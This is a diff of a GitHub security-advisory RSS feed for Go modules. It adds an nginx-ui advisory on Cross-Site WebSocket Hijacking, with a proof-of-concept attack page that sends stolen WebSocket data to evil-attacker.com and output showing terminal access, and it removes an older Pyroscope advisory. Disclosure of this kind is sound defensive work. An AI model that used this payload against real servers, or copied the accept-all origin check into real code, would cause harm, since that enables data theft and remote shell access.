@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-04-21T15:01:47.106Z</updated>
+    <updated>2026-04-21T16:18:04.707Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,165 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/0xJacky/Nginx-UI] Nginx-UI: Cross-Site WebSocket Hijacking (CSWSH) via missing origin validation on all WebSocket endpoints]]></title>
+        <id>https://github.com/advisories/GHSA-78mf-482w-62qj</id>
+        <link href="https://github.com/advisories/GHSA-78mf-482w-62qj"/>
+        <updated>2026-04-21T15:13:04.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>All WebSocket endpoints in nginx-ui use a gorilla/websocket Upgrader with CheckOrigin unconditionally returning true, allowing Cross-Site WebSocket Hijacking (CSWSH). Combined with the fact that authentication tokens are stored in browser cookies (set via JavaScript without HttpOnly or explicit SameSite attributes), a malicious webpage can establish authenticated WebSocket connections to the nginx-ui instance when a logged-in administrator visits the attacker-controlled page.</p>
+<h2 id="details">Details</h2>
+<h3 id="vulnerable-code-pattern">Vulnerable Code Pattern</h3>
+<p>Every WebSocket endpoint in the codebase uses the same unsafe upgrader configuration:</p>
+<pre><code class="language-go">// Found in: api/terminal/pty.go, api/analytic/analytic.go, api/event/websocket.go,
+// api/nginx_log/websocket.go, api/upstream/upstream.go, api/cluster/websocket.go,
+// api/nginx/websocket.go, api/certificate/revoke.go, api/sites/websocket.go,
+// api/llm/llm.go, api/llm/code_completion.go, api/system/upgrade.go
+var upgrader = websocket.Upgrader{
+    CheckOrigin: func(r *http.Request) bool {
+        return true // Accepts ALL origins
+    },
+}
+</code></pre>
+<h3 id="cookie-based-authentication">Cookie-Based Authentication</h3>
+<p>The Vue.js frontend stores JWT tokens as cookies without security attributes (app/src/pinia/moudule/user.ts):</p>
+<pre><code class="language-typescript">watch(token, v =&gt; {
+    cookies.set('token', v, { maxAge: 86400 })  // No HttpOnly, no SameSite
+})
+</code></pre>
+<p>The backend middleware accepts tokens from cookies (internal/middleware/middleware.go):</p>
+<pre><code class="language-go">func getToken(c *gin.Context) (token string) {
+    // ...
+    if token, _ = c.Cookie("token"); token != "" {
+        return token
+    }
+    return ""
+}
+</code></pre>
+<h3 id="affected-endpoints">Affected Endpoints</h3>
+<p>All WebSocket endpoints under the authenticated router group are vulnerable:</p>
+<table>
+<thead>
+<tr>
+<th>Endpoint</th>
+<th>Impact</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>/api/nginx/detail_status/ws</td>
+<td>Leak nginx performance metrics and configuration</td>
+</tr>
+<tr>
+<td>/api/events</td>
+<td>Leak system processing events</td>
+</tr>
+<tr>
+<td>/api/analytic/intro</td>
+<td>Leak CPU, memory, disk, network statistics</td>
+</tr>
+<tr>
+<td>/api/nginx_log</td>
+<td>Read nginx log files (access/error logs)</td>
+</tr>
+<tr>
+<td>/api/pty</td>
+<td>Interactive terminal access (RCE if OTP not enabled)</td>
+</tr>
+<tr>
+<td>/api/upgrade/perform</td>
+<td>Trigger system binary upgrade</td>
+</tr>
+<tr>
+<td>/api/cluster/nodes/enabled</td>
+<td>Leak and manipulate cluster node data</td>
+</tr>
+</tbody></table>
+<h2 id="poc">PoC</h2>
+<h3 id="environment-setup">Environment Setup</h3>
+<pre><code class="language-yaml">services:
+  nginx-ui:
+    image: uozi/nginx-ui:latest
+    ports:
+      - "9000:80"
+    volumes:
+      - nginx-ui-config:/etc/nginx-ui
+volumes:
+  nginx-ui-config:
+</code></pre>
+<h3 id="attack-page-hosted-on-attacker-controlled-domain">Attack Page (hosted on attacker-controlled domain)</h3>
+<pre><code class="language-html">&lt;script&gt;
+// Attacker page at http://evil-attacker.com
+// Victim must be logged into nginx-ui
+const ws = new WebSocket('ws://TARGET_NGINX_UI:9000/api/nginx/detail_status/ws');
+ws.onopen = () =&gt; console.log('CSWSH: Connected from malicious origin!');
+ws.onmessage = (e) =&gt; {
+    console.log('Stolen data:', e.data);
+    fetch('https://evil-attacker.com/collect', {method:'POST', body: e.data});
+};
+&lt;/script&gt;
+</code></pre>
+<h3 id="automated-poc-results">Automated PoC Results</h3>
+<pre><code>[+] VULNERABLE! WebSocket connected from http://evil-attacker.com
+[+] Received: {"stub_status_enabled":false,"running":true,"info":{"active":0,...}}
+
+[+] VULNERABLE! Event stream from http://evil-attacker.com
+[+] Received: {"event":"processing_status","data":{"index_scanning":false,...}}
+
+[+] VULNERABLE! Analytics from http://evil-attacker.com
+[+] Received: {"avg_load":{"load1":0.1,"load5":0.2},"cpu_percent":0.08,...}
+
+[+] CRITICAL: Terminal connected from http://evil-attacker.com!
+[+] Terminal output: 'eae7a76e3ef4 login: '
+[*] Sent username: root
+[+] Output: 'Password: '
+
+[+] Control test (no auth): Correctly rejected with HTTP 403
+</code></pre>
+<h2 id="impact">Impact</h2>
+<p>An attacker can create a malicious webpage that, when visited by an authenticated nginx-ui administrator, silently:</p>
+<ol>
+<li><strong>Steals sensitive server information</strong> -- nginx configuration, performance metrics, CPU/memory/disk usage, network traffic statistics, and system events</li>
+<li><strong>Reads nginx log files</strong> -- potentially containing sensitive request data, IP addresses, and authentication tokens</li>
+<li><strong>Gains interactive terminal access</strong> -- if the administrator has not enabled OTP/2FA, the attacker obtains a full PTY shell on the server, achieving Remote Code Execution</li>
+<li><strong>Triggers system operations</strong> -- including nginx reload/restart and binary upgrades</li>
+</ol>
+<p>The attack requires no privileges and no knowledge of the victim's credentials. The only user interaction needed is visiting a webpage.</p>
+<h2 id="remediation">Remediation</h2>
+<ol>
+<li>Implement proper origin validation in all WebSocket upgraders:</li>
+</ol>
+<pre><code class="language-go">var upgrader = websocket.Upgrader{
+    CheckOrigin: func(r *http.Request) bool {
+        origin := r.Header.Get("Origin")
+        return isAllowedOrigin(origin)
+    },
+}
+</code></pre>
+<ol start="2">
+<li>Set secure cookie attributes:</li>
+</ol>
+<pre><code class="language-typescript">cookies.set('token', v, { maxAge: 86400, sameSite: 'strict', secure: true })
+</code></pre>
+<ol start="3">
+<li>Add CSRF token validation to WebSocket upgrade requests as defense-in-depth.</li>
+</ol>
+<p>A patch is available at <a href="https://github.com/0xJacky/nginx-ui/releases/tag/v2.3.5">https://github.com/0xJacky/nginx-ui/releases/tag/v2.3.5</a></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-78mf-482w-62qj">https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-78mf-482w-62qj</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34403">https://nvd.nist.gov/vuln/detail/CVE-2026-34403</a></li>
+<li><a href="https://github.com/0xJacky/nginx-ui/releases/tag/v2.3.5">https://github.com/0xJacky/nginx-ui/releases/tag/v2.3.5</a></li>
+<li><a href="https://github.com/advisories/GHSA-78mf-482w-62qj">https://github.com/advisories/GHSA-78mf-482w-62qj</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-78mf-482w-62qj</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-04-21T15:13:01.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/0xJacky/Nginx-UI] Nginx-UI: Disabled users retain full API access through previously issued bearer tokens]]></title>
         <id>https://github.com/advisories/GHSA-x234-x5vq-cc2v</id>
@@ -1111,34 +1270,6 @@ return oidc.Profile{
             <uri>https://github.com/advisories/GHSA-497x-rrr9-68jp</uri>
         </author>
         <category label="severity" term="MODERATE"/>
-        <published>2026-04-15T21:30:18.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/grafana/pyroscope] Exposure of Storage Secret in Pyroscope]]></title>
-        <id>https://github.com/advisories/GHSA-m9hq-h476-h2g8</id>
-        <link href="https://github.com/advisories/GHSA-m9hq-h476-h2g8"/>
-        <updated>2026-04-16T21:41:16.000Z</updated>
-        <content type="html"><![CDATA[<p>Pyroscope is an open-source continuous profiling database. The database supports various storage backends, including Tencent Cloud Object Storage (COS).</p>
-<p>If the database is configured to use Tencent COS as the storage backend, an attacker could extract the secret_key configuration value from the Pyroscope API.</p>
-<p>To exploit this vulnerability, an attacker needs direct access to the Pyroscope API. We highly recommend limiting the public internet exposure of all our databases, such that they are only accessible by trusted users or internal systems.</p>
-<p>This vulnerability is fixed in versions:</p>
-<p>1.15.x: 1.15.2 and above.
-1.16.x: 1.16.1 and above.
-1.17.x: 1.17.0 and above (i.e. all versions).</p>
-<p>Thanks to Théo Cusnir for reporting this vulnerability to us via our bug bounty program.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-41118">https://nvd.nist.gov/vuln/detail/CVE-2025-41118</a></li>
-<li><a href="https://grafana.com/security/security-advisories/cve-2025-41118">https://grafana.com/security/security-advisories/cve-2025-41118</a></li>
-<li><a href="https://github.com/advisories/GHSA-m9hq-h476-h2g8">https://github.com/advisories/GHSA-m9hq-h476-h2g8</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-m9hq-h476-h2g8</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
         <published>2026-04-15T21:30:18.000Z</published>
     </entry>
     <entry>
